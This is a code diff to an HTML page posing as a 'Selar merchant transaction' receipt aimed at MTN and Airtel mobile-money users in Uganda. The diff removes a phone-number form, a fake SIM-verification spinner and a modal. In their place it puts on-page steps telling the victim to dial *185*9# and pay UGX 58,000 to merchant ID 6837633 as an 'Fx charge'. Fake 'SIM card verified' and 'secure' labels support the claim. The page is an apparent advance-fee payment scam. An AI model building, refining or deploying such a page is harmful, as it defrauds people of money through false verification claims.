@@ -117,7 +117,7 @@
             background: rgba(255,0,0,0.02);
         }
 
-        /* Payment Form - BUTTON FIT ADJUSTMENTS */
+        /* Payment Card - UPDATED WITH NOTIFICATION CONTENT */
         .payment-card {
             border: 1px solid #eee;
             border-radius: 25px;
@@ -126,62 +126,28 @@
             text-align: left;
         }
 
-        .input-flex { 
-            display: flex; 
-            border: 1px solid #ddd;
-            border-radius: 12px;
-            padding: 4px; /* Creates internal spacing so button isn't touching edges */
-            margin-bottom: 15px;
-            align-items: center;
-        }
-        
-        input[type="text"] {
-            flex: 1;
-            border: none;
-            padding: 8px 12px;
-            font-size: 18px;
-            color: #333;
-            outline: none;
-            background: transparent;
-            min-width: 0; /* Prevents overflow */
-        }
-
-        .btn-continue {
-            background-color: var(--success-green);
+        .notif-header {
+            background: var(--selar-purple);
             color: white;
-            border: none;
-            border-radius: 8px; /* Rounded inside the input box */
-            padding: 10px 20px;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 15px;
             font-weight: bold;
-            font-size: 14px;
-            cursor: pointer;
-            white-space: nowrap;
+            font-size: 13px;
         }
 
-        .network-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #666; }
+        .instruction-list {
+            font-size: 15px;
+            line-height: 1.8;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .network-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #666; border-top: 1px solid #eee; padding-top: 10px; }
         .sim-status { text-align: center; font-style: italic; font-size: 10px; color: #999; margin-top: 10px; }
 
         .note-footer { color: var(--error-red); font-size: 10px; font-weight: bold; margin: 25px 0; line-height: 1.4; }
-
-        /* LOADING & MODAL LOGIC */
-        #loadingOverlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 1000; flex-direction: column; justify-content: center; align-items: center;
-        }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--selar-purple); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        #instructionModal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: center;
-        }
-        .modal-content { background: white; width: 90%; max-width: 350px; border-radius: 20px; overflow: hidden; animation: slideIn 0.3s; }
-        @keyframes slideIn { from { transform: translateY(20px); } }
-        .modal-head { background: var(--selar-purple); color: white; padding: 20px; text-align: center; }
-        .modal-body { padding: 20px; font-size: 14px; }
-        .flag-blink { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        .btn-ok { width: 100%; padding: 15px; background: var(--success-green); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; }
 
     </style>
 </head>
@@ -213,7 +179,7 @@
         <div class="receipt-row"><span>RECIPIENT ID:</span> <span>SI001234595</span></div>
         
         <div style="text-decoration: underline; font-weight: bold; margin: 15px 0 5px;">Mobile Transaction</div>
-        <div class="receipt-row"><span>MOBILE:</span> <span>SIM card not Registered</span></div>
+        <div class="receipt-row"><span>MOBILE:</span> <span>SIM CARD VERIFIED</span></div>
         <div class="receipt-row"><span>NETWORK:</span> <span>MERCHANT ID</span></div>
 
         <div class="total-label">TOTAL AMOUNT:</div>
@@ -222,7 +188,7 @@
         <div style="text-align: center; letter-spacing: 2px; color: #ccc;">----------------------------</div>
 
         <div class="red-alert-box">
-            [ SIM CARD NOT REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM ]
+            [ SIM CARD REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM ]
         </div>
 
         <div style="text-align: center; font-size: 22px; font-weight: 900; letter-spacing: 2px; margin-top: 10px;">
@@ -231,17 +197,24 @@
     </div>
 
     <div class="payment-card">
-        <div class="input-flex">
-            <input type="text" id="phoneNum" placeholder="07XXXXXXXX" maxlength="10">
-            <button type="button" class="btn-continue" onclick="process()">Continue</button>
+        <div class="notif-header">
+            How to pay Fx charge [Use Merchant ID~6837633]
         </div>
+        
+        <div class="instruction-list">
+            <div>📞 <strong>Dial: *185*9#</strong></div>
+            <div>🆔 Enter Merchant ID: <strong>6837633</strong></div>
+            <div>💵 Enter Amount: <strong>58000</strong></div>
+            <div>🔖 Reference: <strong>selar merchant</strong></div>
+        </div>
+
         <div class="network-row">
-            <span>Amount: UGX 21,670</span>
+            <span>Amount: UGX 58,000</span>
             <span><b style="color:#f1c40f">MTN</b> ● <b style="color:#e74c3c">airtel</b></span>
         </div>
         <div class="sim-status">
             PERSON VERIFIED<br>
-            SIM CARD NOT VERIFIED
+            SIM CARD REGISTERED
         </div>
     </div>
 
@@ -254,46 +227,6 @@
         <span>256-bit SSL ● Secure</span>
     </div>
 </div>
-
-<div id="loadingOverlay">
-    <div class="spinner"></div>
-    <h3 id="loadText" style="padding: 0 40px; text-align: center; font-size: 18px;"></h3>
-</div>
-
-<div id="instructionModal">
-    <div class="modal-content">
-        <div class="modal-head">
-            <strong>SELAR MERCHANT TRANSACTION</strong><br>
-            <div style="background:white; color:#e74c3c; display:inline-block; padding:2px 10px; border-radius:5px; margin-top:10px; font-weight:bold;">
-                Currently Supports AIRTEL Sim Card<span class="flag-blink">🇺🇬</span>
-            </div>
-        </div>
-        <div class="modal-body">
-            <p><strong>How to pay Fx charge [Use Merchant ID~6837633]:</strong></p>
-            <p>📞 <strong>Dial: *185*9#</strong></p>
-            <p>🆔 Enter Merchant ID: <strong>6837633</strong></p>
-            <p>💵 Enter Amount: <strong>21670</strong></p>
-            <p>🔖 Reference: <strong>selar merchant</strong></p>
-            <p style="font-size:12px; border-top:1px solid #eee; pt:10px; mt:10px;">Confirm payment to verify your SIM card.</p>
-        </div>
-        <button class="btn-ok" onclick="document.getElementById('instructionModal').style.display='none'">Okay, I have understood</button>
-    </div>
-</div>
-
-<script>
-    function process() {
-        const val = document.getElementById('phoneNum').value;
-        if(val.length < 10) return alert("Enter valid number");
-        
-        document.getElementById('loadText').innerText = `Verifying Sim card ${val} for merchant transaction of 200$~743,000UGX`;
-        document.getElementById('loadingOverlay').style.display = 'flex';
-        
-        setTimeout(() => {
-            document.getElementById('loadingOverlay').style.display = 'none';
-            document.getElementById('instructionModal').style.display = 'flex';
-        }, 7000);
-    }
-</script>
 
 </body>
 </html>
